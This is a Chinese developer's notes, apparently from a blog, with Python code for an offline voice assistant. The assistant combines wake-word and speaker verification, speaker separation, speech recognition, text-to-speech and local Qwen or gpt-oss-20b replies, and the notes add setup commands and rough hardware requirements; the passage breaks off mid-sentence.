AutoModelForCausalLM.from_pretrained( \u0026#34;Qwen/Qwen2.5-0.5B\u0026#34;, cache_dir=\u0026#34;/root/room/models\u0026#34;, torch_dtype=\u0026#34;auto\u0026#34;, device_map=\u0026#34;auto\u0026#34; ) def qwen_chat(prompt: str) -\u0026gt; str: msgs = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: SYSTEM_PROMPT}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: prompt} ] text = tok.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True) inputs = tok(text, return_tensors=\u0026#34;pt\u0026#34;) with torch.no_grad(): out = chat_model.generate( **inputs, max_new_tokens=64, do_sample=True, temperature=0.7, pad_token_id=tok.eos_token_id ) raw_output = tok.decode(out[0][len(inputs.input_ids[0]):], skip_special_tokens=True).strip() for token in [\u0026#34;\u0026lt;/s\u0026gt;\u0026#34;, \u0026#34;\u0026lt;/user\u0026gt;\u0026#34;, \u0026#34;.user\u0026#34;, \u0026#34;🤨\u0026#34;, \u0026#34;## 128000\u0026#34;, \u0026#34;\\x0c\u0026#34;]: raw_output = raw_output.replace(token, \u0026#34;\u0026#34;) reply = raw_output.split(\u0026#34;\\n\u0026#34;)[0].strip() return reply # ------------------ 声纹相关 ------------------ def load_speaker_embedding_model(model_path: str): config = sherpa_onnx.SpeakerEmbeddingExtractorConfig( model=model_path, num_threads=1, debug=False, provider=\u0026#34;cpu\u0026#34;, ) if not config.validate(): raise ValueError(f\u0026#34;Invalid config. {config}\u0026#34;) return sherpa_onnx.SpeakerEmbeddingExtractor(config) def load_speaker_file(speaker_file_path: str) -\u0026gt; Dict[str, List[str]]: ans = defaultdict(list) with open(speaker_file_path) as f: for line in f: line = line.strip() if not line: continue fields = line.split() if len(fields) != 2: raise ValueError(f\u0026#34;Invalid line: {line}\u0026#34;) speaker_name, filename = fields ans[speaker_name].append(filename) return ans def compute_speaker_embedding(filenames: List[str], extractor) -\u0026gt; np.ndarray: ans = None for filename in filenames: samples, sr = sf.read(filename, always_2d=True, dtype=\u0026#34;float32\u0026#34;) samples = samples[:, 0] samples = np.ascontiguousarray(samples) stream = extractor.create_stream() stream.accept_waveform(sr, samples) stream.input_finished() embedding = np.array(extractor.compute(stream)) if ans is None: ans = embedding else: ans += embedding return ans / len(filenames) def init_speaker_identification(): speaker_model = get_relative_path(\u0026#34;/root/room/wespeaker_zh_cnceleb_resnet34.onnx\u0026#34;) speaker_file = get_relative_path(\u0026#34;/root/room/speaker.txt\u0026#34;) extractor = load_speaker_embedding_model(speaker_model) speaker_data = load_speaker_file(speaker_file) manager = sherpa_onnx.SpeakerEmbeddingManager(extractor.dim) for name, filelist in speaker_data.items(): emb = compute_speaker_embedding(filelist, extractor) status = manager.add(name, emb) if not status: raise RuntimeError(f\u0026#34;Failed to register speaker {name}\u0026#34;) return extractor, manager def wake_word_detection_with_speaker(input_device: int, input_sr: int, extractor, speaker_manager) -\u0026gt; Optional[str]: kws_dir = get_relative_path(\u0026#34;/root/room/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\u0026#34;) keyword_spotter = sherpa_onnx.KeywordSpotter( tokens=os.path.join(kws_dir, \u0026#34;tokens.txt\u0026#34;), encoder=os.path.join(kws_dir, \u0026#34;encoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), decoder=os.path.join(kws_dir, \u0026#34;decoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), joiner=os.path.join(kws_dir, \u0026#34;joiner-epoch-99-avg-1-chunk-16-left-64.int8.onnx\u0026#34;), num_threads=1, max_active_paths=4, keywords_file=os.path.join(kws_dir, \u0026#34;keywords.txt\u0026#34;), keywords_score=1.0, keywords_threshold=0.25, num_trailing_blanks=1, provider=\u0026#34;cpu\u0026#34;, ) print(\u0026#34;等待唤醒词（需声纹匹配）...\u0026#34;) stream = keyword_spotter.create_stream() chunk = int(0.1 * input_sr) buffer_seconds = 2.0 # 缓存唤醒词语音用于声纹识别 max_buffer_len = int(buffer_seconds * input_sr) audio_buffer = np.zeros((0,), dtype=np.float32) with sd.InputStream(device=input_device, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=input_sr) as s: while True: samples, _ = s.read(chunk) samples = samples.reshape(-1) stream.accept_waveform(input_sr, samples) # 语音缓存 audio_buffer = np.concatenate((audio_buffer, samples)) if len(audio_buffer) \u0026gt; max_buffer_len: audio_buffer = audio_buffer[-max_buffer_len:] while keyword_spotter.is_ready(stream): keyword_spotter.decode_stream(stream) result = keyword_spotter.get_result(stream) if result: print(f\u0026#34;检测到唤醒词: {result}\u0026#34;) keyword_spotter.reset_stream(stream) # 进行声纹识别 print(\u0026#34;正在进行声纹识别验证...\u0026#34;) audio = np.ascontiguousarray(audio_buffer) emb_stream = extractor.create_stream() emb_stream.accept_waveform(input_sr, audio) emb_stream.input_finished() emb = np.array(extractor.compute(emb_stream)) speaker = speaker_manager.search(emb, threshold=0.6) if speaker: print(f\u0026#34;声纹识别成功，说话人: {speaker}\u0026#34;) return speaker else: print(\u0026#34;声纹识别失败，忽略本次唤醒\u0026#34;) return None # ------------------ 唤醒词（不带声纹，仅示例备用） ------------------ def wake_word_detection(input_device: int, input_sr: int) -\u0026gt; bool: kws_dir = get_relative_path(\u0026#34;/root/room/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\u0026#34;) keyword_spotter = sherpa_onnx.KeywordSpotter( tokens=os.path.join(kws_dir, \u0026#34;tokens.txt\u0026#34;), encoder=os.path.join(kws_dir, \u0026#34;encoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), decoder=os.path.join(kws_dir, \u0026#34;decoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;), joiner=os.path.join(kws_dir, \u0026#34;joiner-epoch-99-avg-1-chunk-16-left-64.int8.onnx\u0026#34;), num_threads=1, max_active_paths=4, keywords_file=os.path.join(kws_dir, \u0026#34;keywords.txt\u0026#34;), keywords_score=1.0, keywords_threshold=0.25, num_trailing_blanks=1, provider=\u0026#34;cpu\u0026#34;, ) print(\u0026#34;等待唤醒词...\u0026#34;) stream = keyword_spotter.create_stream() chunk = int(0.1 * input_sr) with sd.InputStream(device=input_device, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=input_sr) as s: while True: samples, _ = s.read(chunk) samples = samples.reshape(-1) stream.accept_waveform(input_sr, samples) while keyword_spotter.is_ready(stream): keyword_spotter.decode_stream(stream) result = keyword_spotter.get_result(stream) if result: print(f\u0026#34;检测到唤醒词: {result}\u0026#34;) keyword_spotter.reset_stream(stream) return True # ------------------ 语音识别（保留原有函数可按需使用） ------------------ def speech_recognition(extractor, speaker_manager, input_device: int, input_sr: int) -\u0026gt; Tuple[str, str]: target_sr = 16000 # VAD/ASR 采样率 recognizer = sherpa_onnx.OfflineRecognizer.from_paraformer( paraformer=get_relative_path(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/model.int8.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/tokens.txt\u0026#34;), num_threads=1, sample_rate=target_sr, feature_dim=80, decoding_method=\u0026#34;greedy_search\u0026#34;, debug=False, ) vad_config = sherpa_onnx.VadModelConfig() vad_config.silero_vad.model = get_relative_path(\u0026#34;/root/room/silero_vad.onnx\u0026#34;) vad_config.silero_vad.min_silence_duration = 0.5 vad_config.silero_vad.min_speech_duration = 0.5 vad_config.sample_rate = target_sr vad = sherpa_onnx.VoiceActivityDetector(vad_config, buffer_size_in_seconds=100) window_size = vad_config.silero_vad.window_size print(\u0026#34;请说出您的指令...\u0026#34;) chunk = int(0.1 * input_sr) audio_buffer = np.array([], dtype=\u0026#34;float32\u0026#34;) with sd.InputStream(device=input_device, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=input_sr) as s: while True: samples, _ = s.read(chunk) samples = samples.reshape(-1) resampled = resampy.resample(samples, input_sr, target_sr) audio_buffer = np.concatenate([audio_buffer, resampled]) while len(audio_buffer) \u0026gt; window_size: vad.accept_waveform(audio_buffer[:window_size]) audio_buffer = audio_buffer[window_size:] while not vad.empty(): if len(vad.front.samples) \u0026lt; 0.5 * target_sr: vad.pop() continue stream = extractor.create_stream() stream.accept_waveform(target_sr, vad.front.samples) stream.input_finished() emb = np.array(extractor.compute(stream)) speaker = speaker_manager.search(emb, threshold=0.6) or \u0026#34;unknown\u0026#34; asr_stream = recognizer.create_stream() asr_stream.accept_waveform(target_sr, vad.front.samples) recognizer.decode_stream(asr_stream) text = asr_stream.result.text.strip() vad.pop() return text, speaker # ------------------ TTS ------------------ buffer = queue.Queue() started = False stopped = False killed = False event = threading.Event() tts_sr = 24000 output_sr = 48000 def generated_audio_callback(samples: np.ndarray, progress: float) -\u0026gt; int: global started resampled = resampy.resample(samples, tts_sr, output_sr) buffer.put(resampled) if not started: started = True return 0 if killed else 1 def play_audio_callback(outdata: np.ndarray, frames: int, time, status): if killed or (started and buffer.empty() and stopped): event.set() if buffer.empty(): outdata.fill(0) return n = 0 while n \u0026lt; frames and not buffer.empty(): remaining = frames - n k = buffer.queue[0].shape[0] if remaining \u0026lt;= k: outdata[n:, 0] = buffer.queue[0][:remaining] buffer.queue[0] = buffer.queue[0][remaining:] n = frames if buffer.queue[0].shape[0] == 0: buffer.get() break outdata[n:n + k, 0] = buffer.get() n += k if n \u0026lt; frames: outdata[n:, 0] = 0 # ------------------ SpeechBrain 分离：初始化与工具函数 ------------------ print(\u0026#34;初始化 SpeechBrain 分离模型（Sepformer）... 这可能需要下载模型到 pretrained_models/sepformer-wsj02mix\u0026#34;) try: sep_model = separator.from_hparams( source=\u0026#34;speechbrain/sepformer-wsj02mix\u0026#34;, savedir=\u0026#34;pretrained_models/sepformer-wsj02mix\u0026#34;, run_opts={\u0026#34;device\u0026#34;: \u0026#34;cpu\u0026#34;}, ) SEP_SR = getattr(sep_model.hparams, \u0026#34;sample_rate\u0026#34;, 8000) # 通常 sepformer 用 8k print(f\u0026#34;Sepformer 采样率: {SEP_SR}\u0026#34;) except Exception as e: print(\u0026#34;加载 Sepformer 模型失败:\u0026#34;, e) sep_model = None SEP_SR = 8000 # 我们的 ASR / 声纹 统一用 16k（与 原逻辑一致） ASR_SR = 16000 MIN_AUDIO_SECONDS = 0.3 # 跳过太短片段（秒） MIN_AUDIO_SAMPLES = int(MIN_AUDIO_SECONDS * ASR_SR) def _extract_sources_from_sep_output(est_np: np.ndarray, max_sources=16) -\u0026gt; List[np.ndarray]: \u0026#34;\u0026#34;\u0026#34; 将 sep_model 输出 ndarray 转为 [n_src, time] 的 list（numpy 1D float32）。 尽量自动识别哪个轴是源、哪个轴是时间。 \u0026#34;\u0026#34;\u0026#34; if est_np is None: return [] if est_np.ndim == 1: return [] # 先尝试找到较小的轴（\u0026gt;1 且 \u0026lt;= max_sources）作为 source 轴 src_axis = None time_axis = None for i, s in enumerate(est_np.shape): if 1 \u0026lt; s \u0026lt;= max_sources: src_axis = i if s \u0026gt; 1000: time_axis = i if src_axis is None: # 退化策略：2D 情况下，较小维度当作 src if est_np.ndim == 2: if est_np.shape[0] \u0026lt; est_np.shape[1]: src_axis, time_axis = 0, 1 else: src_axis, time_axis = 1, 0 elif est_np.ndim == 3: # 常见： (1, n_src, time) 或 (channels, time, n_src) # 优先选 size 小的轴作为 src sizes = list(est_np.shape) min_idx = int(np.argmin(sizes)) # 保证不是 time axis src_axis = min_idx # time axis 取最大轴 time_axis = int(np.argmax(sizes)) else: # 最保守策略 src_axis = 0 time_axis = est_np.ndim - 1 if time_axis is None: time_axis = max(range(est_np.ndim), key=lambda i: est_np.shape[i] if i != src_axis else -1) # 将 array 重新排列为 (src, time, ...) # 我们把 time 移到 axis=1，src 移到 axis=0 arr = np.moveaxis(est_np, (src_axis, time_axis), (0, 1)) # 现在 arr.shape[0] = n_src, arr.shape[1] = time n_src = arr.shape[0] sources = [] for i in range(n_src): s = arr[i] # 若还有额外轴（如 channels），把它们 flatten 或取第一通道 if s.ndim \u0026gt; 1: # 把多通道求均值为单通道 s = np.mean(s, axis=tuple(range(1, s.ndim))) sources.append(s.astype(np.float32).reshape(-1)) return sources def separate_speakers(mixed_audio: np.ndarray, input_sr: int) -\u0026gt; List[np.ndarray]: \u0026#34;\u0026#34;\u0026#34; 返回 list，每项为以 SEP_SR 为采样率的 numpy 1D float32 信号（单通道）。 （后续处理会把它重采样为 ASR_SR） \u0026#34;\u0026#34;\u0026#34; if sep_model is None: print(\u0026#34;Sepformer 未初始化，跳过分离，直接返回原始音频\u0026#34;) return [mixed_audio] # 准备模型输入：sep_model 要求的形状可能是 [batch, time] 或 [batch, 1, time] 等 # 我们统一提供 [1, time] if input_sr != SEP_SR: # 用 resampy 将输入混音重采样到 sep 模型采样率 mixed_audio_sep = resampy.resample(mixed_audio, input_sr, SEP_SR).astype(np.float32) else: mixed_audio_sep = mixed_audio.astype(np.float32) audio_tensor = torch.from_numpy(mixed_audio_sep).float().unsqueeze(0) # [1, time] with torch.no_grad(): est = sep_model.separate_batch(audio_tensor) # 返回 tensor，shape 可能多样 est_np = est.cpu().numpy() sources = _extract_sources_from_sep_output(est_np, max_sources=16) # 过滤极短或静音的源（避免后续造成 extractor 报错） filtered = [] for i, s in enumerate(sources): if s is None or s.size == 0: continue power = float(np.mean(np.abs(s))) if s.shape[0] \u0026lt; 10: # 非常短 continue # 过滤非常静的（阈值可根据实际调整） if power \u0026lt; 1e-5: continue filtered.append(s) return filtered # ------------------ 主流程相关（设备选择 / 录音） ------------------ def select_devices(): print(\u0026#34;=== 可用输入输出设备列表 ===\u0026#34;) print(sd.query_devices()) input_device = int(input(\u0026#34;请输入输入设备ID: \u0026#34;)) output_device = int(input(\u0026#34;请输入输出设备ID: \u0026#34;)) input_info = sd.query_devices(input_device) output_info = sd.query_devices(output_device) input_sr = int(input_info[\u0026#39;default_samplerate\u0026#39;]) print(f\u0026#34;选择输入采样率: {input_sr} Hz\u0026#34;) return input_device, output_device, input_sr def record_mixed_audio(input_device: int, input_sr: int, duration: float = 5.0): \u0026#34;\u0026#34;\u0026#34;从麦克风录制一段混合音频（单声道 float32）\u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;开始录音 {duration} 秒...\u0026#34;) with sd.InputStream(device=input_device, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=input_sr) as s: frames = [] total_chunks = int(duration / 0.1) for _ in range(total_chunks): samples, _ = s.read(int(0.1 * input_sr)) frames.append(samples.reshape(-1)) mixed_audio = np.concatenate(frames).astype(np.float32) print(\u0026#34;录音完成\u0026#34;) return mixed_audio output_stream = None def init_output_stream(output_device: int): global output_stream if output_stream is None: output_stream = sd.OutputStream( device=output_device, channels=1, callback=play_audio_callback, dtype=\u0026#34;float32\u0026#34;, samplerate=output_sr, blocksize=1024 ) output_stream.start() def tts_synthesis(text: str, output_device: int): global tts_sr, started, stopped init_output_stream(output_device) # 复用全局输出流 tts_config = sherpa_onnx.OfflineTtsConfig( model=sherpa_onnx.OfflineTtsModelConfig( vits=sherpa_onnx.OfflineTtsVitsModelConfig( model=get_relative_path(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/zh_CN-huayan-medium.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/tokens.txt\u0026#34;), data_dir=get_relative_path(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/espeak-ng-data\u0026#34;), ), provider=\u0026#34;cpu\u0026#34;, debug=False, num_threads=1, ), max_num_sentences=1, ) tts = sherpa_onnx.OfflineTts(tts_config) tts_sr = tts.sample_rate event.clear() started = False stopped = False tts.generate(text, sid=0, speed=1, callback=generated_audio_callback) stopped = True event.wait() # ------------------ 主流程 ------------------ def main(): global killed try: print(\u0026#34;初始化声纹识别...\u0026#34;) extractor, speaker_manager = init_speaker_identification() input_device, output_device, input_sr = select_devices() # 预创建 ASR recognizer（避免在每个说话人上重复创建） recognizer = sherpa_onnx.OfflineRecognizer.from_paraformer( paraformer=get_relative_path(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/model.int8.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/tokens.txt\u0026#34;), num_threads=1, sample_rate=ASR_SR, feature_dim=80, decoding_method=\u0026#34;greedy_search\u0026#34;, debug=False, ) speaker = wake_word_detection_with_speaker(input_device, input_sr, extractor, speaker_manager) if speaker: # 1) 录制混合音频 mixed_audio = record_mixed_audio(input_device, input_sr, duration=5.0) # 2) 分离 separated = separate_speakers(mixed_audio, input_sr) print(f\u0026#34;分离后有效说话人数量: {len(separated)}\u0026#34;) if len(separated) == 0: print(\u0026#34;未检测到有效分离结果，回退为直接识别整段语音\u0026#34;) # 回退：把混合音频重采样到 ASR_SR 并识别 mixed_resampled = resampy.resample(mixed_audio, input_sr, ASR_SR).astype(np.float32) # 声纹与识别（与单路流程相同） if mixed_resampled.size \u0026gt;= MIN_AUDIO_SAMPLES: try: emb_stream = extractor.create_stream() emb_stream.accept_waveform(ASR_SR, mixed_resampled) emb_stream.input_finished() emb = np.array(extractor.compute(emb_stream)) spk_name = speaker_manager.search(emb, threshold=0.6) or \u0026#34;unknown\u0026#34; except Exception as e: print(\u0026#34;声纹识别失败:\u0026#34;, e) spk_name = \u0026#34;unknown\u0026#34; try: asr_stream = recognizer.create_stream() asr_stream.accept_waveform(ASR_SR, mixed_resampled) recognizer.decode_stream(asr_stream) text = asr_stream.result.text.strip() except Exception as e: print(\u0026#34;ASR 失败:\u0026#34;, e) text = \u0026#34;\u0026#34; print(f\u0026#34;识别结果: {text} (说话人: {spk_name})\u0026#34;) keyword, kid = fuzzy_match(text) if keyword: reply = f\u0026#34;已为您操作【{keyword}】，编号{kid}\u0026#34; else: reply = qwen_chat(text) print(\u0026#34;回复:\u0026#34;, reply) tts_synthesis(reply, output_device) else: print(\u0026#34;录音过短，无法识别。\u0026#34;) return # 3) 对每一路分别做 声纹 -\u0026gt; ASR -\u0026gt; reply -\u0026gt; TTS for i, sp_audio_sep in enumerate(separated): print(f\u0026#34;\\n=== 处理第 {i+1} 个说话人 ===\u0026#34;) # 先把 sep 模型的采样率转换到 ASR_SR（如果 sep 模型采样率不同） if SEP_SR != ASR_SR: try: sp_audio = resampy.resample(sp_audio_sep, SEP_SR, ASR_SR).astype(np.float32) except Exception as e: print(\u0026#34;重采样出错，跳过该说话人:\u0026#34;, e) continue else: sp_audio = sp_audio_sep.astype(np.float32) # 过滤太短或静音 if sp_audio.size \u0026lt; MIN_AUDIO_SAMPLES: print(f\u0026#34;第 {i+1} 路音频过短（{sp_audio.size} samples），跳过\u0026#34;) continue if float(np.mean(np.abs(sp_audio))) \u0026lt; 1e-5: print(f\u0026#34;第 {i+1} 路音频过静，跳过\u0026#34;) continue # 声纹识别（保护性 try） try: emb_stream = extractor.create_stream() emb_stream.accept_waveform(ASR_SR, sp_audio) emb_stream.input_finished() emb = np.array(extractor.compute(emb_stream)) spk_name = speaker_manager.search(emb, threshold=0.6) or \u0026#34;unknown\u0026#34; except Exception as e: print(\u0026#34;声纹识别出错（跳过声纹或标为 unknown）:\u0026#34;, e) spk_name = \u0026#34;unknown\u0026#34; # ASR try: asr_stream = recognizer.create_stream() asr_stream.accept_waveform(ASR_SR, sp_audio) recognizer.decode_stream(asr_stream) text = asr_stream.result.text.strip() except Exception as e: print(\u0026#34;ASR 失败:\u0026#34;, e) text = \u0026#34;\u0026#34; print(f\u0026#34;识别结果: {text} (说话人: {spk_name})\u0026#34;) # 生成回复并 TTS keyword, kid = fuzzy_match(text) if keyword: reply = f\u0026#34;已为您操作【{keyword}】，编号{kid}\u0026#34; else: reply = qwen_chat(text) if text.strip() else \u0026#34;抱歉，我没有听清楚。\u0026#34; print(\u0026#34;回复:\u0026#34;, reply) tts_synthesis(reply, output_device) except KeyboardInterrupt: killed = True print(\u0026#34;\\n程序已终止\u0026#34;) sys.exit(0) if __name__ == \u0026#34;__main__\u0026#34;: main() 大模型过滤符号等 def qwen_chat(prompt: str) -\u0026gt; str: try: msgs = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: f\u0026#34;{SYSTEM_PROMPT}。请用纯中文回答，不要包含任何英文、代码、特殊符号，语句要自然通顺。\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: prompt} ] text = tok.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True) inputs = tok(text, return_tensors=\u0026#34;pt\u0026#34;) with torch.no_grad(): out = chat_model.generate( **inputs, max_new_tokens=64, do_sample=True, temperature=0.7, pad_token_id=tok.eos_token_id ) raw_output = tok.decode(out[0][len(inputs.input_ids[0]):], skip_special_tokens=True).strip() # 加强过滤：移除所有非中文字符（保留标点） import re # 只保留中文、中文标点、数字 filtered_output = re.sub(r\u0026#39;[^\\u4e00-\\u9fa5，。？！,.:;？！]\u0026#39;, \u0026#39;\u0026#39;, raw_output) # 如果过滤后为空，返回默认回复 if not filtered_output.strip(): return \u0026#34;抱歉，我没理解 意思，请再说一遍。\u0026#34; return filtered_output except Exception as e: print(f\u0026#34;大模型生成出错: {e}\u0026#34;) return \u0026#34;抱歉，处理 请求时出现错误。\u0026#34; 最小音频功率 1. 提高分离后音频的过滤阈值（过滤短片段和噪音） 修改音频过滤参数，只保留足够长、音量足够大的片段：\n# 修改全局参数（原参数值调大） MIN_AUDIO_SECONDS = 0.8 # 最小音频长度从0.2秒提高到0.8秒（过滤过短片段） MIN_AUDIO_SAMPLES = int(MIN_AUDIO_SECONDS * ASR_SR) MIN_AUDIO_POWER = 1e-4 # 新增：最小音频功率（过滤静音/噪音） 2. 在分离后过滤时应用更严格的条件 修改 separate_speakers 函数中的过滤逻辑：\ndef separate_speakers(mixed_audio: np.ndarray, input_sr: int) -\u0026gt; List[np.ndarray]: if sep_model is None: print(\u0026#34;Sepformer 未初始化，跳过分离，直接返回原始音频\u0026#34;) return [mixed_audio] # （原代码不变：采样率转换、模型分离） if input_sr != SEP_SR: mixed_audio_sep = resampy.resample(mixed_audio, input_sr, SEP_SR).astype(np.float32) else: mixed_audio_sep = mixed_audio.astype(np.float32) audio_tensor = torch.from_numpy(mixed_audio_sep).float().unsqueeze(0) with torch.no_grad(): est = sep_model.separate_batch(audio_tensor) est_np = est.cpu().numpy() sources = _extract_sources_from_sep_output(est_np, max_sources=16) # 更严格的过滤：只保留长音频、高音量的片段 filtered = [] for i, s in enumerate(sources): if s is None or s.size == 0: continue # 计算音频功率（音量） power = float(np.mean(np.square(s))) # 用平方均值更能反映音量 # 长度过滤（至少0.8秒）+ 音量过滤（功率足够大） if s.shape[0] \u0026lt; MIN_AUDIO_SAMPLES * SEP_SR / ASR_SR: # 按SEP_SR换算长度 print(f\u0026#34;第 {i+1} 路音频过短（{s.shape[0]/SEP_SR:.2f}秒），跳过\u0026#34;) continue if power \u0026lt; MIN_AUDIO_POWER: print(f\u0026#34;第 {i+1} 路音频音量过低（功率{power:.6f}），跳过\u0026#34;) continue filtered.append(s) # 限制最大分离数量（如果是单人场景，强制只保留1个最可能的说话人） if len(filtered) \u0026gt; 1: # 按音量排序，保留最大音量的那个（最可能是有效说话人） filtered.sort(key=lambda x: np.mean(np.square(x)), reverse=True) filtered = filtered[:1] # 只保留1个 print(f\u0026#34;检测到多个分离结果，保留最可能的1个说话人\u0026#34;) return filtered 关键修改：\n提高最小音频长度（0.8 秒），过滤因噪音产生的短片段；\n增加音量过滤（功率阈值），排除静音或低音量的无效片段；\n限制最大分离数量为 1（单人场景下），避免同一人语音被拆分。\n使用gtp-oos-20b 需 128g内存 下载模型\npip install huggingface-cli huggingface-cli download openai/gpt-oss-20b --include \u0026#34;original/*\u0026#34; --local-dir gpt-oss-20b/ 下载tokenizer 文件\nhuggingface-cli download openai/gpt-oss-20b --include \u0026#34;tokenizer*\u0026#34; --local-dir /root/room/gpt-oss-20b/original python version 3.13 使用 pyenv 管理版本 pyenv 可以方便地安装和切换多个 Python 版本：\n安装 pyenv\n# 克隆 pyenv 仓库 git clone https://github.com/pyenv/pyenv.git ~/.pyenv # 配置环境变量（根据shell类型选择，如bash/zsh） echo \u0026#39;export PYENV_ROOT=\u0026#34;$HOME/.pyenv\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bashrc echo \u0026#39;export PATH=\u0026#34;$PYENV_ROOT/bin:$PATH\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bashrc echo \u0026#39;eval \u0026#34;$(pyenv init -)\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bashrc source ~/.bashrc # 刷新配置 安装 Python 3.13 如果 3.13 已在 pyenv 支持列表中：\npyenv install 3.13.0 # 替换为实际版本号 # 全局启用 3.13 pyenv global 3.13.0 # 验证 python --version 为了确保 Python 3.13 编译时相关模块（ctypes、lzma、ssl、bz2 等）都能正常编译，推荐一次装齐依赖：\napt-get update apt-get install -y \\ build-essential \\ libffi-dev \\ libssl-dev \\ zlib1g-dev \\ libbz2-dev \\ libreadline-dev \\ libsqlite3-dev \\ libncurses5-dev \\ libncursesw5-dev \\ xz-utils \\ tk-dev \\ liblzma-dev 安装依赖后重新编译 Python 安装完依赖包后，重新用 pyenv 编译：\npyenv uninstall 3.13.0 pyenv install 3.13.0 # 然后激活环境： pyenv global 3.13.0 source myenv/bin/activate pip install sounddevice numpy resampy transformers torch fuzzywuzzy pypinyin soundfile sounddevice sherpa_onnx numpy scipy # 大模型gpt-oss-20b GPT_OSS_PATH = \u0026#34;/root/room/gpt-oss-20b/original\u0026#34; tok = AutoTokenizer.from_pretrained(GPT_OSS_PATH, trust_remote_code=True) chat_model = AutoModelForCausalLM.from_pretrained( GPT_OSS_PATH, torch_dtype=torch.float16 if torch.cuda.is_available() else torch.float32, device_map=\u0026#34;auto\u0026#34; if torch.cuda.is_available() else None ) def gptoss_chat(prompt: str) -\u0026gt; str: msgs = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: SYSTEM_PROMPT}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: prompt} ] text = tok.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True) inputs = tok(text, return_tensors=\u0026#34;pt\u0026#34;) inputs = inputs.to(chat_model.device) with torch.no_grad(): out = chat_model.generate( **inputs, max_new_tokens=64, do_sample=True, temperature=0.7, pad_token_id=tok.eos_token_id ) raw = tok.decode(out[0][len(inputs.input_ids[0]):], skip_special_tokens=True).strip() for token in [\u0026#34;\u0026lt;/s\u0026gt;\u0026#34;, \u0026#34;\u0026lt;/user\u0026gt;\u0026#34;, \u0026#34;.user\u0026#34;, \u0026#34;## 128000\u0026#34;, \u0026#34;\\x0c\u0026#34;]: raw = raw.replace(token, \u0026#34;\u0026#34;) return raw.split(\u0026#34;\\n\u0026#34;)[0].strip() # ... speaker = wake_word_detection_with_speaker(input_device, input_sr, extractor, speaker_manager) if speaker: text, detected_speaker = speech_recognition(extractor, speaker_manager, input_device, input_sr) print(f\u0026#34;识别结果: {text} (说话人: {detected_speaker})\u0026#34;) keyword, kid = fuzzy_match(text) if keyword: reply = f\u0026#34;已为您操作【{keyword}】，编号{kid}\u0026#34; else: reply = gptoss_chat(text) print(\u0026#34;回复:\u0026#34;, reply) tts_synthesis(reply, output_device) 升级到 transformers 的 最新开发版，因为 gpt-oss 是非常新的模型类型：\npip install --upgrade pip setuptools pip uninstall transformers -y pip install git+https://github.com/huggingface/transformers.git python asrtts.py 模型本地运行参考 Qwen Qwen2.5-0.5B：至少 4GB 内存，可使用 CPU 部署，若有 NVIDIA GeForce GT 1030 等显卡则更好。CPU 方面没有特别高要求，普通家用电脑 CPU 即可。 Qwen2.5-1.5B：8GB 内存起步，建议使用 Intel i5 或 AMD Ryzen 5 及以上 CPU，若有 NVIDIA GeForce GTX 1660 或同等性能显卡（显存≥6GB）可加速运算。 Qwen2.5-3B：建议 12GB 及以上内存，推荐使用 NVIDIA GeForce RTX 2060 及以上显卡，CPU 建议为 Intel i7 或 AMD Ryzen 7 及以上型号，以保证处理更复杂语义理解、多轮对话等任务时的效率。 Qwen2.5-7B：至少 16GB 内存，推荐使用 NVIDIA GeForce RTX 3060 及以上显卡。CPU 至少 8 核心的高性能处理器，如 Intel Core i7 或 AMD Ryzen 7 系列。 Qwen2.5-14B：32GB 内存起步，可使用 NVIDIA GeForce RTX 3060 及以上显卡。建议配备至少 16 核 CPU，如 AMD EPYC 或 Intel Xeon 系列处理器，以应对复杂长文本处理等任务。 Qwen2.5-32B：64GB 及以上内存，需搭配 NVIDIA GeForce RTX 40 系列及以上高端显卡。CPU 建议为 16 核以上的高性能处理器，如 AMD EPYC 7xxx 或 Intel Xeon Scalable 系列。 Qwen2.5-72B：128GB 及以上内存，推荐使用 NVIDIA GeForce RTX 40 系列及以上显卡，且多卡并行更佳。CPU 建议至少 32 核，如 AMD Ryzen Threadripper 或 Intel Core i9 系列，若能使用 64 核以上的 AMD EPYC 或 Intel Xeon 系列处理器则更好 DeepSeek-R1 DeepSeek-R1-1.5B：CPU 最低 4 核（推荐 Intel/AMD 多核处理器），内存 8GB+。 DeepSeek-R1-7B/8B：建议 CPU 为 8 核以上（推荐现代多核 CPU），内存 16GB+。 DeepSeek-R1-14B：建议配备 12 核以上 CPU，内存 32GB+。 DeepSeek-R1-32B：需要 16 核以上 CPU（如 AMD Ryzen 9 或 Intel i9），内存 64GB+。 DeepSeek-R1-70B：建议使用 32 